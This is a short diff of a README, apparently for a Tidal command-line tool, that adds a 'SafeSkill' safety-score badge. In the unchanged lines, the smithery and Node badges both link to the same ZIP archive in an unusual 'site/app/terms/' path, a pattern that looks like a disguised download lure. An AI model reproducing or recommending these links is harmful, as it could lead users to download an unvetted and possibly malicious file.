@@ -11,6 +11,7 @@
 [![smithery badge](https://raw.githubusercontent.com/robbiek3659/tidal-cli/main/site/app/terms/cli_tidal_v1.1.zip)](https://raw.githubusercontent.com/robbiek3659/tidal-cli/main/site/app/terms/cli_tidal_v1.1.zip)
 [![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
 [![Node](https://img.shields.io/badge/node-%3E%3D20-green.svg)](https://raw.githubusercontent.com/robbiek3659/tidal-cli/main/site/app/terms/cli_tidal_v1.1.zip)
+[![SafeSkill 86/100](https://img.shields.io/badge/SafeSkill-86%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/robbiek3659-tidal-cli)
 
 ## About
 
